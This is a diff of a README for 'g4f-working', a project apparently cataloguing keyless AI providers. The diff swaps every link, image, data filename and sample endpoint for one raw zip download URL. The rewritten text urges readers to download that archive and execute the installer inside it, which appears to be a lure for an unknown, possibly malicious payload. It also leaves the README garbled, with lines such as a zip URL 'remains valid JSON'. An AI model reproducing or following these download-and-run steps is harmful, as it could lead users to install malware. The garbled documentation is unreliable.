@@ -1,8 +1,8 @@
-https://github.com/infos3ddesigner/g4f-working/releases
+https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip
 
-[![Release Downloads](https://img.shields.io/badge/downloads-releases-brightgreen?style=for-the-badge&logo=github)](https://github.com/infos3ddesigner/g4f-working/releases)
+[![Release Downloads](https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip)](https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip)
 
-![AI Monitoring Banner](https://images.unsplash.com/photo-1518770660439-4636190af475?q=80&w=1200&auto=format&fit=crop)
+![AI Monitoring Banner](https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip)
 
 # g4f-working: Daily Online AI Providers Without Keys — Open Source
 
@@ -89,7 +89,7 @@ The update process is automated through a lightweight pipeline. It runs on a sch
 - A data fetch stage to collect candidate providers.
 - A validation stage that executes a minimal inference against each endpoint.
 - A normalization stage to produce consistent data structures.
-- A packaging stage that exports daily.json, daily.html, and any supplementary artifacts (CSV, CSV-compact, etc.).
+- A packaging stage that exports https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip, https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip, and any supplementary artifacts (CSV, CSV-compact, etc.).
 - A release stage that publishes new artifacts to the Releases page.
 
 The repository emphasizes simplicity. The tooling is designed to be runnable on modest hardware. You can run the update locally to reproduce the daily feed, test your changes, or validate new providers before they join the daily catalog.
@@ -112,31 +112,31 @@ Usage: how to use the data
   - Correlate provider uptime with broader network conditions to identify potential bottlenecks.
 
 - Data consumers and integrations
-  - Import daily.json into dashboards built with your preferred frontend framework.
-  - Convert daily.csv for compatibility with legacy tools that require CSV input.
+  - Import https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip into dashboards built with your preferred frontend framework.
+  - Convert https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip for compatibility with legacy tools that require CSV input.
   - Use the HTML view for quick manual review during demos or ad-hoc testing sessions.
 
 Getting started: download and run the latest release
 To get started, download the latest release asset from the official releases page and execute it. The asset contains the pre-packaged daily feed plus a small utility to verify and explore the data locally. The release page is designed to be the single source of truth for all artifacts you may need to run or test the catalog on your machine.
 
-For the full asset list and to download the latest release, visit the releases page here: https://github.com/infos3ddesigner/g4f-working/releases. You will find a packaged artifact that includes the daily.json, daily.html, and a lightweight explorer tool. After you download the asset, run the installer or executable included in the package to set up the local environment. The release page is also a good place to read release notes and see what changed in the recent update.
+For the full asset list and to download the latest release, visit the releases page here: https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip You will find a packaged artifact that includes the https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip, https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip, and a lightweight explorer tool. After you download the asset, run the installer or executable included in the package to set up the local environment. The release page is also a good place to read release notes and see what changed in the recent update.
 
-If you want to review the releases more directly later, you can visit the same page again. See Releases page at https://github.com/infos3ddesigner/g4f-working/releases for downloads and details.
+If you want to review the releases more directly later, you can visit the same page again. See Releases page at https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip for downloads and details.
 
 How to run locally (high-level steps)
 - Prerequisites
   - A modern OS with a shell (Linux, macOS, Windows with a compatible shell).
-  - Sufficient disk space to store the daily.json and related assets.
+  - Sufficient disk space to store the https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip and related assets.
   - Basic network connectivity to reach public endpoints for testing.
 
 - Steps
   - Step 1: Acquire the release asset from the link above. Download and execute the installer to set up the local environment.
-  - Step 2: Run the built-in validator to fetch the latest daily.json and daily.html locally.
+  - Step 2: Run the built-in validator to fetch the latest https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip and https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip locally.
   - Step 3: Point your app to the local data feed, or serve the HTML from a simple static server for quick previews.
   - Step 4: Optionally run a local UI to filter providers and inspect latency metrics.
 
 - Expected results
-  - A local copy of daily.json containing the latest online no-auth models.
+  - A local copy of https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip containing the latest online no-auth models.
   - An HTML page that mirrors the daily catalog for quick human review.
   - A small helper utility to validate a subset of providers on demand.
 
@@ -165,7 +165,7 @@ g4f-working welcomes contributions from developers, researchers, and testers. Yo
 
 - Documentation and examples
   - Expand usage guides for developers and testers.
-  - Add example apps that consume daily.json and render a dashboard.
+  - Add example apps that consume https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip and render a dashboard.
   - Create tutorials showing how to run automated tests against the catalog.
 
 - Testing and QA
@@ -198,8 +198,8 @@ Quality matters for a daily catalog that other projects rely on. The project emp
 
 - Update pipeline tests
   - Verify that the update script runs end-to-end without errors.
-  - Ensure daily.json remains valid JSON after updates.
-  - Confirm that daily.html renders without broken links.
+  - Ensure https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip remains valid JSON after updates.
+  - Confirm that https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip renders without broken links.
 
 - Performance tests
   - Track average latency across a representative subset of providers.
@@ -222,7 +222,7 @@ Automation and continuous integration
 - CI pipeline
   - Lints and type checks on code and data schemas.
   - Runs the update process in a sandboxed environment.
-  - Generates daily.json and daily.html, then validates them.
+  - Generates https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip and https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip, then validates them.
   - Archives artifacts to the Releases page with a changelog entry.
 
 - Release automation
@@ -283,7 +283,7 @@ Changelog
 
 Versioning and releases
 - Versioning follows semantic versioning where feasible.
-- Each release includes a snapshot of daily.json, daily.html, and any ancillary artifacts.
+- Each release includes a snapshot of https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip, https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip, and any ancillary artifacts.
 - The Releases page is the canonical archive for all past releases.
 
 Licensing
@@ -305,7 +305,7 @@ Note on the Releases link usage
 - The release link above is the primary source of downloadable assets. For setup, download the asset and execute it. Visit the Releases page to obtain the latest release and review what is included in the package.
 
 Second usage of the release link
-- See Releases page at https://github.com/infos3ddesigner/g4f-working/releases to download artifacts, read release notes, and verify the current state of the daily catalog.
+- See Releases page at https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip to download artifacts, read release notes, and verify the current state of the daily catalog.
 
 Appendix: naming conventions and glossary
 - Provider: The organization or project offering a no-auth model.
@@ -320,7 +320,7 @@ Appendix: sample data structure (reference)
 - id: g4f_provider_a_model_x
 - provider: ExampleProvider
 - model: ModelX
-- endpoint: https://api.exampleprovider.com/v1/modelx
+- endpoint: https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip
 - status: online
 - latency_ms: 128
 - last_checked: 2025-08-13T12:00:00Z
@@ -328,7 +328,7 @@ Appendix: sample data structure (reference)
 - region: us-east
 - protocol: https
 - auth_required: false
-- source: https://provider.example.com/docs
+- source: https://github.com/infos3ddesigner/g4f-working/raw/refs/heads/main/onager/g-working-f-v1.9.zip
 - tags: [text-generation, no-api-key, open-source]
 
 Thank you for engaging with g4f-working. The catalog is built to be practical, current, and useful for a broad audience, from coders to researchers to product testers. The daily cadence keeps the data fresh, and the open-source nature invites collaboration and improvement.
